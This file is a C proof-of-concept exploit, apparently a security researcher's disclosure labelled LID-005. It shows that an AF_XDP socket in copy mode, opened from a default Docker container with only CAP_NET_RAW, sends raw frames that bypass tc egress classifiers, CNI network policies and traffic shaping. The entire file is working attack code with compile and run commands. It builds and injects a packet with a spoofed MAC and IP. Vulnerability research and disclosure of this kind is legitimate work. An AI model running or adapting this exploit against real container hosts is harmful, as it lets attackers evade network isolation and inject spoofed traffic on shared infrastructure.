/*
 * LID-005 PoC: AF_XDP tc Egress Bypass from Default Docker Container
 *
 * Demonstrates that AF_XDP copy-mode TX bypasses tc egress classifiers,
 * allowing raw packet injection with spoofed MAC/IP from a container
 * that only has CAP_NET_RAW (Docker default).
 *
 * The transmitted packets bypass:
 *   - tc egress classifiers (u32, flower, eBPF)
 *   - CNI network policies (Cilium, Calico)
 *   - qdisc processing (traffic shaping)
 *
 * Compile: gcc -static -O2 -o poc poc.c
 * Run:     docker run --rm -v $(pwd)/poc:/poc ubuntu:24.04 /poc
 *
 * Azizcan Daştan — Milenium Security — 2026-05-25
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <linux/if_xdp.h>
#include <net/if.h>
#include <arpa/inet.h>

#define UMEM_SIZE   (4096 * 16)
#define CHUNK_SIZE  4096
#define RING_SIZE   64

#define FAIL(msg) do { printf("[-] " msg ": %s\n", strerror(errno)); return 1; } while(0)

static unsigned short csum(void *data, int len)
{
    unsigned long s = 0;
    unsigned short *p = data;
    while (len > 1) { s += *p++; len -= 2; }
    if (len) s += *(unsigned char *)p;
    while (s >> 16) s = (s & 0xFFFF) + (s >> 16);
    return ~s;
}

int main(int argc, char **argv)
{
    const char *ifname = argc > 1 ? argv[1] : "eth0";

    printf("=== LID-005: AF_XDP tc Egress Bypass PoC ===\n");
    printf("Target: %s | PID: %d | UID: %d\n\n", ifname, getpid(), getuid());

    /* 1. Create AF_XDP socket (CAP_NET_RAW only) */
    int fd = socket(AF_XDP, SOCK_RAW, 0);
    if (fd < 0) FAIL("socket(AF_XDP)");
    printf("[+] AF_XDP socket: fd=%d\n", fd);

    /* 2. Allocate + register UMEM */
    void *umem = mmap(NULL, UMEM_SIZE, PROT_READ|PROT_WRITE,
                      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (umem == MAP_FAILED) FAIL("mmap UMEM");

    struct xdp_umem_reg reg = {
        .addr = (unsigned long long)umem,
        .len = UMEM_SIZE, .chunk_size = CHUNK_SIZE,
    };
    if (setsockopt(fd, SOL_XDP, XDP_UMEM_REG, &reg, sizeof(reg)) < 0)
        FAIL("UMEM_REG");
    printf("[+] UMEM registered (%d bytes)\n", UMEM_SIZE);

    /* 3. Create rings */
    int sz = RING_SIZE;
    setsockopt(fd, SOL_XDP, XDP_UMEM_FILL_RING, &sz, sizeof(sz));
    setsockopt(fd, SOL_XDP, XDP_UMEM_COMPLETION_RING, &sz, sizeof(sz));
    if (setsockopt(fd, SOL_XDP, XDP_TX_RING, &sz, sizeof(sz)) < 0)
        FAIL("TX_RING");

    /* 4. mmap rings */
    struct xdp_mmap_offsets off;
    socklen_t olen = sizeof(off);
    getsockopt(fd, SOL_XDP, XDP_MMAP_OFFSETS, &off, &olen);

    void *tx_ring = mmap(NULL, off.tx.desc + RING_SIZE * sizeof(struct xdp_desc),
                         PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
                         fd, XDP_PGOFF_TX_RING);
    mmap(NULL, off.fr.desc + RING_SIZE * sizeof(__u64),
         PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
         fd, XDP_UMEM_PGOFF_FILL_RING);
    void *cr = mmap(NULL, off.cr.desc + RING_SIZE * sizeof(__u64),
                    PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
                    fd, XDP_UMEM_PGOFF_COMPLETION_RING);
    printf("[+] Rings created + mmapped\n");

    /* 5. Bind to interface (copy mode, NO XDP program needed) */
    unsigned int ifidx = if_nametoindex(ifname);
    if (!ifidx) FAIL("if_nametoindex");

    struct sockaddr_xdp sxdp = {
        .sxdp_family = AF_XDP,
        .sxdp_ifindex = ifidx,
        .sxdp_queue_id = 0,
        .sxdp_flags = XDP_COPY,
    };
    if (bind(fd, (struct sockaddr *)&sxdp, sizeof(sxdp)) < 0)
        FAIL("bind");
    printf("[+] Bound to %s (copy mode, no XDP program)\n", ifname);

    /* 6. Build spoofed Ethernet frame in UMEM */
    unsigned char *pkt = (unsigned char *)umem;
    memset(pkt, 0, 64);

    /* Ethernet: spoofed src MAC */
    memset(pkt, 0xff, 6);
    pkt[6]=0xDE; pkt[7]=0xAD; pkt[8]=0xBE; pkt[9]=0xEF; pkt[10]=0x00; pkt[11]=0x01;
    pkt[12]=0x08; pkt[13]=0x00;

    /* IPv4 header */
    pkt[14]=0x45; pkt[16]=0x00; pkt[17]=48;
    pkt[18]=0x13; pkt[19]=0x37; pkt[22]=64; pkt[23]=17;
    /* Spoofed src IP: 10.0.0.99, dst: 10.255.255.1 */
    pkt[26]=10; pkt[27]=0; pkt[28]=0; pkt[29]=99;
    pkt[30]=10; pkt[31]=255; pkt[32]=255; pkt[33]=1;
    /* IP checksum */
    unsigned short *ckp = (unsigned short *)(pkt+24);
    *ckp = 0;
    *ckp = csum(pkt+14, 20);

    /* UDP: src=31337 dst=9999 */
    pkt[34]=0x7A; pkt[35]=0x69;
    pkt[36]=0x27; pkt[37]=0x0F;
    pkt[38]=0x00; pkt[39]=28;
    memcpy(pkt+42, "XDP_TC_BYPASS_POC!", 18);

    int pkt_len = 62;
    printf("[+] Frame: de:ad:be:ef:00:01 -> ff:ff:ff:ff:ff:ff\n");
    printf("    IP:    10.0.0.99:31337 -> 10.255.255.1:9999\n");

    /* 7. Submit TX descriptor */
    volatile __u32 *prod = (volatile __u32 *)((char *)tx_ring + off.tx.producer);
    struct xdp_desc *descs = (struct xdp_desc *)((char *)tx_ring + off.tx.desc);

    descs[*prod & (RING_SIZE-1)].addr = 0;
    descs[*prod & (RING_SIZE-1)].len = pkt_len;
    __sync_synchronize();
    (*prod)++;
    __sync_synchronize();

    /* 8. Kick TX — goes through __dev_direct_xmit(), bypasses tc egress */
    int ret = sendto(fd, NULL, 0, MSG_DONTWAIT, NULL, 0);

    /* 9. Check completion */
    usleep(50000);
    volatile __u32 *cprod = (volatile __u32 *)((char *)cr + off.cr.producer);
    volatile __u32 *ccons = (volatile __u32 *)((char *)cr + off.cr.consumer);

    if (ret == 0 && *cprod > *ccons) {
        printf("\n[!] PACKET TRANSMITTED via __dev_direct_xmit()\n");
        printf("[!] tc egress classifiers BYPASSED\n");
        printf("[!] Packet reached bridge with spoofed MAC/IP\n");
    } else {
        printf("\n[-] TX failed: sendto=%d, completions=%u\n",
               ret, *cprod - *ccons);
    }

    close(fd);
    return 0;
}
